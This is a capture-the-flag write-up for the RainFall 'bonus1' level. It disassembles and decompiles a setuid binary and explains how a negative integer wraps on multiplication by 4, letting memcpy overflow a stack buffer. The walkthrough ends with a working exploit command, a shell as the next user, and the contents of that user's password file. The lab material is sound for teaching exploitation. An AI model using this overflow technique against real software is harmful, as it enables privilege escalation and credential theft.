# bonus1 - Stack Buffer Overflow - Int Overflow

On `bonus1`'s HOME, we find a binary named : `bonus1`

```shell
...
0x08048424  main
...
```

let's disassemble `main()` function:

```shell
gefâž¤  disass main
Dump of assembler code for function main:
   0x08048424 <+0>:	push   ebp
   0x08048425 <+1>:	mov    ebp,esp
   0x08048427 <+3>:	and    esp,0xfffffff0
   0x0804842a <+6>:	sub    esp,0x40
   0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:	add    eax,0x4
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    eax,0x1
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:	add    eax,0x8
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:	mov    edx,eax
   0x08048464 <+64>:	lea    eax,[esp+0x14]
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
End of assembler dump.
```

<br>

After decompiling it using gdb, we build this code in C language:

```c
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <unistd.h>


int main( int ac, char **av ) {

	char	buffer[40]; // esp+0x14
	int		n = atoi(av[1] /*ebp+0x10*/); // esp+0x3c

	if (n > 9)
		return 1;

	memcpy( buffer, av[2], n * 4);

	if (n == 0x574f4c46)
		execl("/bin/sh", "sh", NULL);

	return (0);

}
```

we understand here that there are two argument:

1. Un number that has to be less or equal to **9** ... and equal to
**0x574f4c46** just after copied the second argument to the buffer.
This number is multiplied by 4 in order to be passed as *size* argument
to memcpy.

2. An input string copied to the buffer.

So, We deduce that the number is the key !

<br>

From assembly code, we now that the buffer is stored at `esp+0x14` and the
number at `esp+0x3c`. So, the distance between them is **40** (0x28)... but the
maximum value that seems to be possible to copy is 9 times 4 or 36 bytes.

To exploit this binary we need to copy 44 bytes (40 bytes of offset + 4 bytes
to rewrite `n` value). Let's speak in binary base to understand this exploit.

1. *44* equal to *101100* 

2. After divide by 4, we find *11*. always too big for the maximum input value
(9)

3. But as we are on 32-bit architecture, the two last bigger bytes will
disappear after the multiplication by 4..

4. So, in this way, **00000000000000000000000000001011** (*11*) or 
**11000000000000000000000000001011** (signed int: *-1073741813*) lead to the
same number after multiply them by 4 => **00000000000000000000000000101100** (*44*).

Perfect, we got it **-1073741813**

<br>

A little diagram to resume it:


- **11000000000000000000000000001011** (base 2) => **c000000b** (base 16) =>
**3221225483** (base 10: uint) => **-1073741813** (base 10: int)

- **11000000000000000000000000001011** * 4 = **101100** (base 2) => **2c** (base 16) =>
**44** (base 10)


<br>

We can now exploit this BOF :

```shell
./bonus1 -1073741813 $(python -c 'print "A" * 40 + "\x57\x4f\x4c\x46"[::-1]')
```

```shell
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "A" * 40 + "\x57\x4f\x4c\x46"[::-1]')
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
